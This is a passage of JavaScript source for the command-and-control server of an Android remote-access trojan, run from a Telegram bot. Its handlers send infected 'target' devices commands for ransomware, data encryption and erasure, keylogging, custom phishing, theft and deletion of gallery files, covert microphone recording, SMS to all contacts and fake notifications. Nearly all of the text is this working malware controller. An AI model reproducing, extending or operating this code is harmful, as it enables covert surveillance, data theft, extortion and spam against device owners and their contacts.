                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'Settings') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('Settings');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'Erase_data') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('Erase_data');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'Ransomware') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('Ransomware');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'custom_phishing') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('custom_phishing');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'encrypt_data') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('encrypt_data');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'decrypt_data') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('decrypt_data');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'keylogger_on') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('keylogger_on');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'keylogger_off') {
        const ws = appClients.get(uuid);
        if (ws && ws.readyState === webSocket.OPEN) {
            ws.send('keylogger_off');
            appBot.deleteMessage(id, msg.message_id)
            appBot.sendMessage(id,
                '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨⏳\n\n' +
                `• 𝘿𝙚𝙫𝙞𝙘𝙚: <b>${ws.deviceInfo.model}</b>\n` +
                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [
                            ["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], 
                            ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"],
                            ["📊 𝙎𝙩𝙖𝙩𝙪𝙨", "📢 𝘽𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩"]
                        ],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    else if (command == 'send_message') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, 
            '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n' +
            '•ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ',
            {reply_markup: {force_reply: true}})
    }
    else if (command == 'send_message_to_all') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨\n\n' +
            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
            {reply_markup: {force_reply: true}}
        )
    }
    else if (command == 'file') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📩𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙🗳️\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
    }
    else if (command == 'delete_file') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📂𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚💥\n\n' +
            '• ʏᴏᴜ ᴅᴏ ɴᴏᴛ ɴᴇᴇᴅ ᴛᴏ ᴇɴᴛᴇʀ ᴛʜᴇ ꜰᴜʟʟ ꜰɪʟᴇ ᴘᴀᴛʜ, ᴊᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴍᴀɪɴ ᴘᴀᴛʜ. ꜰᴏʀ ᴇxᴀᴍᴘʟᴇ, ᴇɴᴛᴇʀ<b> DCIM/Camera </b> ᴛᴏ ᴅᴇʟᴇᴛᴇ ɢᴀʟʟᴇʀʏ ꜰɪʟᴇꜱ.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
    }
    else if (command == 'microphone') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
    }
    else if (command == 'toast') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚\n\n' +
            '• ᴛᴏᴀꜱᴛ ɪꜱ ᴀ ꜱʜᴏʀᴛ ᴍᴇꜱꜱᴀɢᴇ ᴛʜᴀᴛ ᴀᴘᴘᴇᴀʀꜱ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ ꜱᴄʀᴇᴇɴ ꜰᴏʀ ᴀ ꜰᴇᴡ ꜱᴇᴄᴏɴᴅꜱ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
    }
    else if (command == 'show_notification') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📮𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣\n\n' +
            '• ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ʙᴇ ᴀᴘᴘᴇᴀʀ ɪɴ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ꜱᴛᴀᴛᴜꜱ ʙᴀʀ ʟɪᴋᴇ ʀᴇɢᴜʟᴀʀ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
    }
    else if (command == 'play_audio') {
        const userSession = userSessions.get(id) || {};
        userSession.currentDevice = uuid;
        userSessions.set(id, userSession);
        
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• 📀𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮🏖️\n\n' +
            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴅɪʀᴇᴄᴛ ʟɪɴᴋ ᴏꜰ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ꜱᴏᴜɴᴅ, ᴏᴛʜᴇʀᴡɪꜱᴇ ᴛʜᴇ ꜱᴏᴜɴᴅ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ᴘʟᴀʏᴇᴅ',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
    }
});

// بهبود سیستم ping
setInterval(function () {
    const now = Date.now();
    appClients.forEach((ws, uuid) => {
        try {
            if (ws.readyState === webSocket.OPEN) {
                // اگر بیش از 60 ثانیه از آخرین پاسخ گذشته، دستگاه را قطع شده در نظر بگیر
                if (now - ws.deviceInfo.lastPing > 60000) {
                    console.log(`Device ${uuid} seems disconnected, closing connection`);
                    ws.close();
                    appClients.delete(uuid);
                } else {
                    ws.send('ping');
                }
            }
        } catch (error) {
            console.error(`Ping error for device ${uuid}:`, error);
            appClients.delete(uuid);
        }
    });
    
    try {
        axios.get(address).then(r => "").catch(e => console.error('Health check failed:', e));
    } catch (e) {
        console.error('Health check error:', e);
    }
}, 15000);

appServer.listen(process.env.PORT || 8999, () => {
    console.log(`🚀 Server started on port ${process.env.PORT || 8999}`);
    console.log(`📱 Ready to handle multiple devices simultaneously`);
    console.log(`🔗 WebSocket server running`);
});